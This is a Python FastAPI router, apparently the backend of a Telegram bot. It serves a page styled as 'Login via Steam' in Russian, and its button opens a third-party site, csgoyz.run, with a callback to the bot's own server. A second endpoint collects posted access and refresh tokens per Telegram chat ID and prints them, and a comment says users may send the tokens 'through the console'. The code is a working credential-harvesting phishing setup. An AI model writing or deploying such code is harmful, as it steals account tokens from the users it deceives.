from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse, JSONResponse

router = APIRouter()

SELF = "https://tg-bot-test-gkbp.onrender.com"

RAM_DATA = {}

# 1️⃣ старт авторизации — промежуточная страница
@router.get("/auth/start")
async def auth_start(chat_id: int):
    """
    Пользователь открывает ссылку → промежуточная страница с кнопкой.
    """
    tg_callback = f"{SELF}/auth/receive?chat_id={chat_id}"
    return HTMLResponse(f"""
<!DOCTYPE html>
<html>
<head>
<title>Авторизация Steam</title>
<style>
body {{ font-family: Arial; background:#0f1117; color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; }}
button {{ padding:12px 24px; background:#1b2738; color:white; border:none; border-radius:6px; cursor:pointer; }}
</style>
</head>
<body>
<h2>🔐 Вход через Steam</h2>
<p>Нажмите кнопку, чтобы авторизоваться и автоматически отправить токены.</p>
<button id="login">Войти через Steam</button>

<script>
document.getElementById("login").onclick = async function() {{
    const tg_callback = "{tg_callback}";
    const popup = window.open("https://csgoyz.run/?tg_callback=" + encodeURIComponent(tg_callback),
                              "_blank", "width=500,height=700");

    alert("Откроется новое окно. После завершения авторизации закройте его и вернитесь на эту страницу, чтобы отправить токены.");

    // Ждём пока пользователь вернется и вручную отправит токены (потому что cross-origin чтение localStorage невозможно)
}};
</script>
</body>
</html>
""")

# 2️⃣ приём токенов после fetch с csgoyz.run
@router.post("/auth/receive")
async def auth_receive(request: Request, chat_id: int):
    """
    Сюда csgoyz.run (или пользователь через консоль) отправляет токены.
    """
    data = await request.json()

    RAM_DATA.setdefault(chat_id, {})
    RAM_DATA[chat_id]["access"] = data.get("token")
    RAM_DATA[chat_id]["refresh"] = data.get("refresh")

    print("🔥 TOKENS:", chat_id, RAM_DATA[chat_id])
    return JSONResponse({"ok": True})